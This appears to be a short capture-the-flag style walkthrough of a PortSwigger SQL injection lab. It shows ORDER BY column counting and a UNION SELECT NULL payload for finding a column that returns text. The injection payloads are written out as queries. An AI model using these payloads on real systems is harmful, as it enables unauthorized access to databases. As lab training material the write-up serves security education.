## Lab Description
![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/c1dd1a38-91c6-40bd-94a1-95741b739996)

### Solution

Query made:

`SELECT * FROM someTable WHERE category = '<CATEGORY>'`

  - ORDER BY 4 return an error, means there are 3 columns being queried and retreived by the web application.

`SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --`

![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/59f9c763-ef1d-443c-bbc0-12cd108ad608)

**Determine the column containng text data -**
  
  - We need to use the UNION SELECT payload using 3 NULL values. Try thetring value *SYzz32* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'33eWHU',NULL`

![1](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/daf680f5-6472-4885-ba7a-31613f1df330)

![2](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/10151850-33bf-49fa-9cd5-5ed85134a8ba)
